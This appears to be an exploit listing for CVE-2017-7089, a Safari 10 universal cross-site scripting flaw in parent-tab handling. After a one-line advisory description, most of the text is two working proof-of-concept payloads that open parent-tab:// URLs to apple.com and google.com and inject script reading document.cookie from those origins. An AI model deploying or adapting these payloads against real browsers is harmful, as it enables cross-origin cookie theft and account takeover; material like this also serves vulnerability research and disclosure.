
CVE-2017-7089

Impact: Processing maliciously crafted web content may lead to universal cross site scripting

Description: A logic issue existed in the handling of the parent-tab. This issue was addressed with improved state management.
Safari 10
Local SOP bypass

<script> function Pew(){var doc=open(&#039;parent-tab://apple.com&#039;);doc.document.body.innerHTML=&#039;<img src=q onerror=alert(document.cookie)>&#039;;}</script><button onclick=Pew();>Click me!</button>

Exploit by Frans Ros√©n

data:text/html,<script>function y(){x=open(&#039;parent-tab://google.com&#039;,&#039;_top&#039;),x.document.body.innerHTML=&#039;<img/src=""onerror="alert(document.cookie)">&#039;};setTimeout(y,100)</script>

